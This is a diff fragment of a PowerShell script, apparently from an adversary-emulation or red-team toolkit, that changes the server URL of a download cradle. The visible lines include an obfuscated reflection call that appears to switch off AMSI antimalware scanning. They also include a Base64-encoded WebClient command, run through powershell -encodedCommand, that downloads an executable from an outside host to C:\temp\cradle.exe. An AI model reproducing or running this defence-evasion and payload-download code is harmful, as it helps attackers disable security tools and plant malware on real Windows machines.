@@ -41,7 +41,7 @@ $object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'m
 $Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
 $Uninitialize.Invoke($object,$null)
 
-$estring=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$server="https://ca.reyes-holdings.uk";$url="$server/file/download";$wc=New-Object System.Net.WebClient; $data=$wc.DownloadData($url); rm -force "C:\temp\cradle.exe" -ea ignore;[io.file]::WriteAllBytes("C:\temp\cradle.exe",$data) | Out-Null;'))
+$estring=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$server="https://pa.attck.community";$url="$server/file/download";$wc=New-Object System.Net.WebClient; $data=$wc.DownloadData($url); rm -force "C:\temp\cradle.exe" -ea ignore;[io.file]::WriteAllBytes("C:\temp\cradle.exe",$data) | Out-Null;'))
 powershell -encodedCommand $estring
 
 # Define the path to the executable
